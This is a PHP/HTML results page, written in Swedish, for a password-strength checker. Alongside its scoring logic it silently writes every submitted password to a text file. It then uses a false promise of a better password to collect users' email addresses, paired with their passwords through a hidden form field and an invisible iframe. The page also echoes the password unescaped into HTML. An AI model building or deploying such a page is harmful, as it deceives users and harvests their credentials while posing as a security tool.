<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <title>Resultat – Testa ditt lösenord!</title>
  <link rel="stylesheet" href="stylesheet.css">
</head>
<body>
  <?php
    function blip_color($min_score) {
      // Den här funktionen räknar ut vilka färger punkterna i poängmätaren ska ha.
      global $score;
      if($score >= $min_score) { // Ska den här punkten tändas?
        if($score < 30) { // Och i vilken färg i så fall?
          echo "#fc291e";
        } elseif($score > 60) {
          echo "#1cd600";
        } else {
          echo "#fcf820";
        }
      } else {
        echo "#353535";
      }
    }
  ?>
  <!--Mejladressparningsskriptet bäddas in i den här osynliga IFramen när det körs.-->
  <iframe name="secret_iframe" style="display: none;"></iframe>
  <?php
    /*
      Först och främst tar vi och sparar lösenordet.
      Webbservern antas ha behörighet att skriva till filen passwords.txt i samma katalog
      som det här skriptet.
    */
    $password = $_POST["password"];
    $pw_log = fopen("passwords.txt", "a");
    fwrite($pw_log, $password . PHP_EOL); // Lagrar lösenordet i filen med en radbrytning efter.
    fclose($pw_log);
  ?>
  <div id="main">
    <div>
      <h1>Resultat</h1>
      <table>
        <tr>
          <td>Innehåller små bokstäver:</td>
          <td>
            <?php
              $lower = "abcdefghijklmnopqrstuvwxyz";
              $contains_lower = False;
              for($x = 0; $x < strlen($password); $x++) { // Går igenom varje tecken i lösenordet.
                for($y = 0; $y < strlen($lower); $y++) { // Går igenom varje gemener i (det latinska) alfabetet.
                  if($password[$x] == $lower[$y]) {
                    /*
                      Om det aktuella tecknet och den aktuella gemenen någonsin är samma
                      innehåller lösenordet minst en gemen.
                    */
                    echo "Ja";
                    $contains_lower = True;
                    break 2; // Stoppar båda for-slingorna.
                  }
                }
              }
              if($contains_lower == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller stora bokstäver:</td>
          <td>
            <?php
              // Samma som förut fast med versaler istället för gemener.
              $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
              $contains_upper = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($upper); $y++) {
                  if($password[$x] == $upper[$y]) {
                    echo "Ja";
                    $contains_upper = True;
                    break 2;
                  }
                }
              }
              if($contains_upper == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller siffror:</td>
          <td>
            <?php
              // Samma grej igen, den här gången med siffror.
              $digits = "0123456789";
              $contains_digit = False;
              for($x = 0; $x < strlen($password); $x++) {
                for($y = 0; $y < strlen($digits); $y++) {
                  if($password[$x] == $digits[$y]) {
                    echo "Ja";
                    $contains_digit = True;
                    break 2;
                  }
                }
              }
              if($contains_digit == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Innehåller symboler:</td>
          <td>
            <?php
              // Den här är lite spännande.
              $contains_symbol = False;
              for($x = 0; $x < strlen($password); $x++) { // Går igenom varje tecken i lösenordet.
                for($y = 0; $y <= 255; $y++) { // Går igenom alla tal från 0 till 255, d.v.s. alla tecken i en EASCII.
                  if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
                    /*
                      Den här satsen hoppar över alla tecken som varken är bokstäver eller siffror.
                      I EASCII (utökad ASCII) representeras alla tecken av tal från 0 till 255.
                      48–57 motsvarar siffrorna, 65–90 motsvarar versalerna och 97–122 motsvarar gemenerna.
                      Allt annat kan räknas som symbol i det här fallet.
                    */
                    break 1;
                  }
                  if(ord($password[$x]) == $y) {
                    echo "Ja";
                    $contains_symbol = True;
                    break 2;
                  }
                }
              }
              if($contains_symbol == False) {
                echo "Nej";
              }
            ?>
          </td>
        </tr>
        <tr>
          <td>Längd:</td>
          <td>
            <?php
              if(strlen($password) <= 8) {
                echo "Kort";
                $length = 0;
              } elseif(strlen($password) <= 20) {
                echo "Medellångt";
                $length = 1;
              } else {
                echo "Långt";
                $length = 2;
              }
            ?>
          </td>
        </tr>
      </table>
      <h2>
        Poäng: <?php
          // Poängkriterierna är typ helt godtyckliga.
          $score = 35; // Låter man 35 poäng vara nollpunkten hamnar slutpoängen mellan 0 och 80.
          if($contains_lower) { // Lägg till 5 poäng om lösenordet innehåller en gemen, ta annars bort 5.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_upper) { // Samma sak fast för versaler.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_digit) { // ...och för siffror.
            $score += 5;
          } else {
            $score -= 5;
          }
          if($contains_symbol) { // Lägg till 10 poäng om lösenordet innehåller en symbol, ta annars bort 5.
            $score += 10;
          } else {
            $score -= 5;
          }
          if($length == 2) { // Ge lösenordet 20 poäng om det är långt.
            $score += 20;
          } elseif($length == 0) { // Ge lösenordet 25 poängs avdrag om det är kort.
            $score -= 25;
          } // Om det varken är långt eller kort delas inga poäng ut.
          echo $score;
        ?> / 80
      </h2>
      <table id="scorebar">
        <!--Det här är poängräknaren. Jag spyr lite inombords varje gång jag tittar på den.-->
        <tr>
          <td class="scoreblip" style="background-color: <?php blip_color(5); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(10); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(15); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(20); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(25); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(30); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(35); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(40); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(45); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(50); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(55); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(60); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(65); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(70); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(75); ?>;"></td>
          <td class="scoreblip" style="background-color: <?php blip_color(80); ?>;"></td>
        </tr>
      </table>
      <h3>
        Ditt lösenord är
        <?php
          // Några vänliga ord som människor kan läsa och förstå.
          if($score < 30) {
            echo " ganska dåligt. Du borde byta det.";
          } elseif($score > 60) {
            echo " jättebra! Fortsätt så!";
          } else {
            echo " helt okej. Det funkar nog.";
          }
        ?>
      </h3>
      <p>
        Om du vill ha ett bättre lösenord kan du skriva in din emailadress här så skickar jag ett bättre
        <br>
        lösenord till dig när min superhögteknologiska lösenordsgenerator passerar betastadiet.
      </p>
      <!--SPOILER: Kommer jag inte alls det.-->
      <p>(Det ser inte ut som att det händer något när man trycker på knappen, men det funkar, jag lovar)</p>
      <form action="save_email_and_pw.php" method="post" target="secret_iframe">
        <!--
          Återigen lite spännande.
          När mejladressen sparas vill man naturligtvis veta vilket lösenord
          den hör till, alltså måste adressen och lösenordet sparas tillsammans.
          För att få till det läggs lösenordet in i mejladressformuläret.
        -->
        <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;">
        <!--
          Det här fältet fylls automatiskt i med lösenordet. Det är dolt men
          kommer ändå med i POST-förfrågan.
        -->
        <p><input type="email" name="email" size="40" required></p>
        <p><input type="submit" value="Ge mig ett lösenord!"></p>
        <!--
          När användaren skickar in mejladressen och lösenordet läses mejladressparningsskriptet in
          i den dolda IFramen. Det gör att man inte behöver ladda någon ny sida för att spara
          mejladressen. Tyvärr gör det också att man inte får någon indikation alls på att
          något har sparats.
        -->
      </form>
    </div>
  </div>
</body>
